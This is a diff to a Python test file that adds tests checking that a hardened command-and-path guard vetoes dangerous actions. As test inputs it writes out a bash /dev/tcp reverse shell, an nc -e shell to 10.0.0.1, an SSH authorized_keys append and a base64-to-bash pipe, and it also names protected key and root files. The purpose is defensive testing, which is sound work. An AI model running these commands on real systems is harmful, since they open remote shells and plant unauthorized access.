@@ -11,6 +11,7 @@ from python.helpers.preclusion import (  # noqa: E402
     PreclusionPolicy,
     Verdict,
     default_policy,
+    hardened_policy,
 )
 from python.helpers.rsfs import (  # noqa: E402
     FilesystemSentinel,
@@ -72,6 +73,42 @@ def test_batch_mixed():
     p = Preclusion(default_policy())
     out = p.evaluate_batch([("cmd", "echo hi"), ("delete", "/etc/hosts")])
     assert out[0].allowed and not out[1].allowed
+
+
+# -- Hardened policy -------------------------------------------------------
+
+def test_hardened_blocks_reverse_shell():
+    p = Preclusion(hardened_policy())
+    assert p.evaluate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").verdict is Verdict.VETO
+
+
+def test_hardened_blocks_authorized_keys_append():
+    p = Preclusion(hardened_policy())
+    assert p.evaluate_command("echo key >> ~/.ssh/authorized_keys").verdict is Verdict.VETO
+
+
+def test_hardened_blocks_base64_pipe_shell():
+    p = Preclusion(hardened_policy())
+    assert p.evaluate_command("echo aaa | base64 -d | bash").verdict is Verdict.VETO
+
+
+def test_hardened_protects_root_and_keys():
+    p = Preclusion(hardened_policy())
+    assert p.evaluate_path("/root/.bashrc", "write").verdict is Verdict.VETO
+    assert p.evaluate_path("/home/user/app/server.key", "write").verdict is Verdict.VETO
+
+
+def test_hardened_is_superset_of_default():
+    d, h = default_policy(), hardened_policy()
+    assert set(d.protected_paths).issubset(set(h.protected_paths))
+    assert set(d.readonly_paths).issubset(set(h.readonly_paths))
+
+
+def test_default_swarm_is_hardened_by_default(tmp_path):
+    (tmp_path / "a.txt").write_text("x")
+    swarm = build_default_swarm([str(tmp_path)], command_source=lambda: ["nc -e /bin/sh 10.0.0.1 9"])
+    r = swarm.run_round()
+    assert any(o.kind == "risk" for o in r.observations)
 
 
 # -- RSFS ------------------------------------------------------------------
